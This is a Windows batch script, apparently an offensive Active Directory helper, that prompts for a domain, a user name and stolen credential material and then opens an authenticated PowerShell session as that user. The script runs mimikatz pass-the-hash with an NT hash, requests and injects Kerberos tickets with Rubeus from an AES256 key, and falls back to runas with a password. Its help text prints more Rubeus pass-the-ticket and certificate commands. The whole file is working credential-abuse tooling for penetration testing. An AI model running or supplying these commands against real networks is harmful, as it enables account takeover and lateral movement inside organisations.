@echo off
cd C:\Tools

set /p domain= "Domain:   "
IF not defined domain goto noexit

set "powershellcmd=ls \\%domain%\sysvol; $DC = (Get-ADDomainController -Server %domain%)[0].Hostname; $PSDefaultParameterValues = @{ '*-AD*:Server'= $DC }; net start w32time; w32tm /config /update /manualpeerlist:%domain%; w32tm /monitor /computers:%domain%; cd C:\Tools; klist"

for /f "usebackq delims=" %%I in (`powershell "\"%domain%\".toUpper()"`) do set "upper=%%~I"
for %%a in ("a=A" "b=B" "c=C" "d=D" "e=E" "f=F" "g=G" "h=H" "i=I"
        "j=J" "k=K" "l=L" "m=M" "n=N" "o=O" "p=P" "q=Q" "r=R"
        "s=S" "t=T" "u=U" "v=V" "w=W" "x=X" "y=Y" "z=Z" "ä=Ä"
        "ö=Ö" "ü=Ü") do (
  call set %domain%=%%%domain%:%%~a%%
)
ksetup.exe /SetRealmFlags %upper% tcpsupported


set /p user=  "User:     "
IF not defined user goto commonexit


set /p rc4=  "NT hash:  "
:rc4
IF defined rc4 (
  mimikatz.exe privilege::debug "sekurlsa::pth /domain:%domain% /user:%user% /ntlm:%rc4% /run:"""powershell.exe -NoExit -Command """""""""Rubeus.exe asktgt /domain:%domain% /user:%user% /rc4:%rc4% /ptt; %powershellcmd%""""""""""""" exit
  REM Rubeus.exe asktgt /domain:%domain% /user:%user% /rc4:%rc4% /createnetonly:powershell.exe /show
  goto commonexit
)

set /p aes256= "AES256:   "
:aes256
IF defined aes256 (
  Rubeus.exe asktgt /domain:%domain% /user:%user% /aes256:%aes256% /createnetonly:"powershell.exe -NoExit -Command %powershellcmd%" /show
  goto commonexit
)

:password
runas.exe /netonly /user:%domain%\%user% "powershell.exe -NoExit -Command %powershellcmd%"
REM Rubeus.exe asktgt /domain:%domain% /user:%user% /password:%password% /createnetonly:powershell.exe /show

:commonexit
REM Allow for seeing errors
goto end
exit

:noexit
echo.
echo TICKET (TGT) as credential material:
echo Rubeus.exe createnetonly /domain:sde.inlanefreight.local /username:DC02$ /password:blah /program:powershell.exe /show
echo Rubeus.exe ptt /ticket:<base64_or_file-path>
echo.
echo CERTIFICATE as credential material:
echo Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:Name /certificate:C:\tmp\User1.pfx /password:PFXPass1! /createnetonly:powershell.exe /show
echo.

:end
